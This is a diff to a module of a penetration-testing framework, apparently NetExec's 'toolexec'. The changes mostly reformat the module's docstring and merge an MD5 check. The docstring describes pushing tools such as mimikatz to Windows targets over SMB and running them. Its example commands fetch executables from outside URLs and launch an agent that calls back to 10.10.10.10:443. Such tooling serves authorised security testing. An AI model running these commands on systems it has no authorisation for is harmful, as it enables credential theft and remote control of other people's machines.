@@ -1,5 +1,4 @@
 #!/usr/bin/env python3
-# -*- coding: utf-8 -*-
 
 import os
 import requests
@@ -8,9 +7,7 @@ from nxc.paths import DATA_PATH
 from nxc.helpers.logger import highlight
 
 class NXCModule:
-    """
-    Module by @FaganAfandiyev
-    """
+    """Module by @FaganAfandiyev"""
 
     name = "toolexec"
     description = "Transfers and executes utilities for usage in a new environment."
@@ -20,45 +17,45 @@ class NXCModule:
 
     def options(self, context, module_options):
         r"""
-            Transfers and executes utilities in a new environment.
+        Transfers and executes utilities in a new environment.
 
-            Modes:
-            - all       → Transfers all enum + exploit tools
-            - enum      → Transfers enumeration tools
-            - exploit   → Transfers exploitation tools
-            - custom    → Transfers user-defined local files or URLs
-            - update    → Downloads the latest toolset to LOCAL_DIR
+        Modes:
+        - all       → Transfers all enum + exploit tools
+        - enum      → Transfers enumeration tools
+        - exploit   → Transfers exploitation tools
+        - custom    → Transfers user-defined local files or URLs
+        - update    → Downloads the latest toolset to LOCAL_DIR
 
-            Options:
-            -------
-            MODE            Deployment mode (default: all)
-            DIR             Remote target path (default: C:\\Windows\\Tasks\\)
-            OVERWRITE       Overwrite existing files on target (default: False)
-            CUSTOM          Comma-separated file paths, URLs, or built-in tool names
-            EXEC            Execute tools on target (default: False)
-            ARGS            Arguments to pass to tools
-            UPDATE          Download latest tools from URLs (default: False)
-            LOCAL_DIR       Where tools are stored locally (default: ~/.nxc/data/toolexec)
+        Options:
+        -------
+        MODE            Deployment mode (default: all)
+        DIR             Remote target path (default: C:\\Windows\\Tasks\\)
+        OVERWRITE       Overwrite existing files on target (default: False)
+        CUSTOM          Comma-separated file paths, URLs, or built-in tool names
+        EXEC            Execute tools on target (default: False)
+        ARGS            Arguments to pass to tools
+        UPDATE          Download latest tools from URLs (default: False)
+        LOCAL_DIR       Where tools are stored locally (default: ~/.nxc/data/toolexec)
 
-            Notes:
-            ------
-            - Tools are never downloaded automatically. You must pass UPDATE=True.
-            - This makes the module usable without internet access.
-            - To extend tools, edit `get_tools_based_on_mode()` dictionary.
+        Notes
+        -----
+        - Tools are never downloaded automatically. You must pass UPDATE=True.
+        - This makes the module usable without internet access.
+        - To extend tools, edit `get_tools_based_on_mode()` dictionary.
 
-            Examples:
-            ---------
-            nxc smb 192.168.1.1 -u {user} -p {password} --local-auth -M toolexec -o MODE=enum
-            nxc smb 192.168.1.1 -u {user} -p {password} --local-auth -M toolexec -o MODE=enum DIR=C:\\Windows\\Temp\\
+        Examples
+        --------
+        nxc smb 192.168.1.1 -u {user} -p {password} --local-auth -M toolexec -o MODE=enum
+        nxc smb 192.168.1.1 -u {user} -p {password} --local-auth -M toolexec -o MODE=enum DIR=C:\\Windows\\Temp\\
             nxc smb 192.168.1.1 -u {user} -p {password} --local-auth -M toolexec -o MODE=custom CUSTOM=/path/to/tools/
-            nxc smb 192.168.1.1 -u {user} -p {password} --local-auth -M toolexec -o MODE=custom CUSTOM=/path/to/agent.exe
-            nxc smb 192.168.1.1 -u {user} -p {password} --local-auth -M toolexec -o MODE=custom CUSTOM=https://example.com/tool1.exe,https://example.com/tool2.exe
-            nxc smb 192.168.1.1 -u {user} -p {password} --local-auth -M toolexec -o MODE=custom CUSTOM=mimikatz
-            nxc smb 192.168.1.1 -u {user} -p {password} --local-auth -M toolexec -o MODE=custom CUSTOM=https://example.com/tool.exe EXEC=True ARGS='--help'
-            nxc smb 192.168.1.1 -u {user} -p {password} --local-auth -M toolexec -o MODE=all OVERWRITE=True
-            nxc smb 192.168.1.1 -u {user} -p {password} --local-auth -M toolexec -o UPDATE=True
-            nxc smb 192.168.1.1 -u {user} -p {password} --local-auth -M toolexec -o MODE=custom CUSTOM=/path/to/agent.exe EXEC=True ARGS='-connect 10.10.10.10:443'
-    """
+        nxc smb 192.168.1.1 -u {user} -p {password} --local-auth -M toolexec -o MODE=custom CUSTOM=/path/to/agent.exe
+        nxc smb 192.168.1.1 -u {user} -p {password} --local-auth -M toolexec -o MODE=custom CUSTOM=https://example.com/tool1.exe,https://example.com/tool2.exe
+        nxc smb 192.168.1.1 -u {user} -p {password} --local-auth -M toolexec -o MODE=custom CUSTOM=mimikatz
+        nxc smb 192.168.1.1 -u {user} -p {password} --local-auth -M toolexec -o MODE=custom CUSTOM=https://example.com/tool.exe EXEC=True ARGS='--help'
+        nxc smb 192.168.1.1 -u {user} -p {password} --local-auth -M toolexec -o MODE=all OVERWRITE=True
+        nxc smb 192.168.1.1 -u {user} -p {password} --local-auth -M toolexec -o UPDATE=True
+        nxc smb 192.168.1.1 -u {user} -p {password} --local-auth -M toolexec -o MODE=custom CUSTOM=/path/to/agent.exe EXEC=True ARGS='-connect 10.10.10.10:443'
+        """
         self.MODE = module_options.get("MODE", "all").lower()
         self.location = module_options.get("DIR", "C:\\Windows\\Tasks\\").replace("/", "\\")
         if not self.location.endswith("\\"):
@@ -117,11 +114,10 @@ class NXCModule:
             response = requests.get(tool["url"])
             with open(local_path, "wb") as f:
                 f.write(response.content)
-            if expected_md5 and not self.UPDATE:
-                if self.calculate_md5(local_path) != expected_md5:
-                    context.log.fail(f"MD5 mismatch for {filename}")
-                    os.remove(local_path)
-                    return False
+            if expected_md5 and not self.UPDATE and self.calculate_md5(local_path) != expected_md5:
+                context.log.fail(f"MD5 mismatch for {filename}")
+                os.remove(local_path)
+                return False
             return True
         except Exception as e:
             context.log.fail(f"Download failed for {filename}: {e}")
